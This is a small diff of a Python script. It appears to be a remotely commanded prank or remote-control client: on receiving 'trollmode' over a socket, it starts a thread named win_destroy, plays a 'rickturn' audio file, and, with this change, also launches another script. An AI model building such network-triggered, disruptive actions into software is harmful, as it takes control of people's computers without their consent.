@@ -47,6 +47,7 @@ while True:
             data = (s.recv(1024)).decode("utf-8")
             if "trollmode" in data:
                 threading.Thread(target=win_destroy).start()
+                os.startfile("pymatrix.py")
                 mixer.init()
                 mixer.music.load("rickturn.mp3")
                 mixer.music.set_volume(0.7)
